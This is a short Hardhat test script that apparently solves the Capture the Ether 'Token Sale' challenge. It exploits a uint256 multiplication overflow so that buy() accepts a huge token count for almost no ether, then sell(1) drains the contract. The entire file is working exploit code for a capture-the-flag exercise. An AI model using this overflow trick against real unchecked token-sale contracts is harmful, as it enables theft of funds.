import { expect } from "chai"
import { ethers } from "hardhat"

describe("token-sale", function () {
  it("should take tokens away", async function () {
    const chalAddr = ""

    const chal = await ethers.getContractAt("TokenSaleChallenge", chalAddr)

    const uint256Wei = 2n ** 256n
    const etherWei = 10n ** 18n

    const numTokens = uint256Wei/etherWei + 1n
    const value = numTokens*etherWei - uint256Wei

    const tx = await chal.buy(numTokens, {value: value})
    await tx.wait()

    const tx2 = await chal.sell(1)
    await tx2.wait()

    expect(await chal.isComplete()).to.be.true
  })
})